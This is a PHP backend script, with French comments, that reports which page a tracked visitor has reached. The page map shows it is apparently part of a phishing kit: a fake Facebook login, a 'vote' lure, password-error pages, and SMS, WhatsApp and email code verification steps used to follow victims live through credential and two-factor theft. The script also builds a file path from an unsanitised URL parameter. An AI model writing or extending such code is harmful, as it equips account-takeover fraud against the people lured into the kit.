<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'Paramètres manquants']);
    exit;
}

// Récupérer la page actuelle du client
$currentPage = 'Inconnue';
$trackingFile = 'tracking/' . $sessionId . '.json';

if (file_exists($trackingFile)) {
    $trackingData = json_decode(file_get_contents($trackingFile), true);
    if (isset($trackingData['page'])) {
        $currentPage = $trackingData['page'];
    }
}

// Fonction pour obtenir le nom de la page
function getPageName($page) {
    $pageNames = [
        'index.php' => 'Page d\'accueil',
        'connexion_f.php' => 'Connexion Facebook',
        'loading.php' => 'Chargement',
        'password_incorrect.php' => 'Mot de passe incorrect',
        'technical_error.php' => 'Erreur technique',
        'vote_accepted.php' => 'Vote accepté',
        'vote_approved.php' => 'Vote approuvé',
        'sms_verification.php' => 'Vérification SMS',
        'whatsapp_verification.php' => 'Vérification WhatsApp',
        'email_verification.php' => 'Vérification email',
        'authorize_device.php' => 'Autorisation d\'appareil',
        'retry.php' => 'Réessayer'
    ];
    
    return $pageNames[$page] ?? $page;
}

// Fonction pour obtenir la couleur de la page
function getPageColor($page) {
    $pageColors = [
        'index.php' => '#1877f2',
        'connexion_f.php' => '#1877f2',
        'loading.php' => '#ff9800',
        'password_incorrect.php' => '#f44336',
        'technical_error.php' => '#f44336',
        'vote_accepted.php' => '#4caf50',
        'vote_approved.php' => '#4caf50',
        'sms_verification.php' => '#9c27b0',
        'whatsapp_verification.php' => '#25D366',
        'email_verification.php' => '#2196f3',
        'authorize_device.php' => '#2196f3',
        'retry.php' => '#ff9800'
    ];
    
    return $pageColors[$page] ?? '#757575';
}

// Fonction pour obtenir l'icône de la page
function getPageIcon($page) {
    $pageIcons = [
        'index.php' => 'fas fa-home',
        'connexion_f.php' => 'fab fa-facebook-f',
        'loading.php' => 'fas fa-spinner',
        'password_incorrect.php' => 'fas fa-times-circle',
        'technical_error.php' => 'fas fa-exclamation-triangle',
        'vote_accepted.php' => 'fas fa-check-circle',
        'vote_approved.php' => 'fas fa-check-double',
        'sms_verification.php' => 'fas fa-sms',
        'whatsapp_verification.php' => 'fab fa-whatsapp',
        'email_verification.php' => 'fas fa-envelope',
        'authorize_device.php' => 'fas fa-shield-alt',
        'retry.php' => 'fas fa-redo'
    ];
    
    return $pageIcons[$page] ?? 'fa-question-circle';
}

// Préparer la réponse
$response = [
    'success' => true,
    'page' => $currentPage,
    'pageName' => getPageName($currentPage),
    'pageColor' => getPageColor($currentPage),
    'pageIcon' => getPageIcon($currentPage)
];

// Renvoyer la réponse au format JSON
header('Content-Type: application/json');
echo json_encode($response);